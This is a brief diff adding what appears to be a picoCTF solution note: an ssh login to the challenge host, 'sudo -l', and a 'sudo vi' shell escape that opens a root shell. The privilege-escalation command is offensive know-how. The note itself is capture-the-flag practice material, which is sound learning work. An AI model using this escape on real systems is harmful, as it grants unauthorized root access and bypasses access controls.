@@ -1,0 +1,4 @@
+ssh -p 55583 picoplayer@saturn.picoctf.net
+sudo -l
+do this to open root shell
+sudo vi -c ':!/bin/sh' /dev/null
